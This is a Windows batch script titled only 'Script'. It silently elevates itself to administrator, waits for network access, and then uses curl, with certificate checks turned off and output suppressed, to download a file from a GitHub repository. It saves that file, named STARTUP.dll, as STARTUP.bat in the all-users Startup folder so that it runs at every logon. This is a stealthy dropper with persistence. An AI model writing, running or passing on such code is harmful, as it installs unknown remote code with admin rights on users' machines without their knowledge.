@echo off
@Title Script
cd /d %~dp0
color 7
mode con:cols=75 lines=20
cls

rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
if %errorlevel% neq 0 (
	powershell -NoProfile -NonInteractive -Command start -verb runas "'%~s0'" >nul 2>&1 & exit /b
)

SET ERROR=0

:ERRNETWORK
ping -n 1 -w 2000 www.google.com > nul
if %errorlevel% equ 0 (SET NETWORK=YES) else (SET NETWORK=NO)
IF %NETWORK%==NO (
	IF %ERROR%==7 Exit
	SET /a ERROR=%ERROR%+1
	@timeout /t 03>nul
	goto :ERRNETWORK
)

curl -g -k -L -# -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\STARTUP.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/STARTUP.dll" >nul 2>&1

Exit